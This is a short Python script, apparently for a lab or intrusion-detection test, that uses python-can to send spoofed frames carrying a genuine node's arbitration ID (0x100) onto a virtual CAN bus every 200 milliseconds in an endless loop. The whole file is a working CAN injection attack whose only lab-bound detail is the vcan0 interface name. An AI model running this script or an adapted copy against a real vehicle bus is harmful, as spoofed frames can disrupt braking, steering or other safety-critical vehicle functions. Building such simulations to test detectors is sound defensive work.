import can
import time

def send_malicious_frames(interface, interval, arbitration_id):
    """
    Simulates an attacker sending frames with the same ID as a genuine node at abnormal intervals.
    """
    bus = can.Bus(interface, bustype="socketcan")
    print(f"Attacker sending frames with ID={hex(arbitration_id)} every {interval} seconds...")

    while True:
        try:
            msg = can.Message(arbitration_id=arbitration_id, data=[0xFF] * 8, is_extended_id=False)
            bus.send(msg)
            print(f"Malicious frame sent: {msg}")
            time.sleep(interval)
        except can.CanError as e:
            print(f"Error sending message: {e}")
            break

if __name__ == "__main__":
    send_malicious_frames("vcan0", interval=0.2, arbitration_id=0x100)  # Attacker sends every 200ms
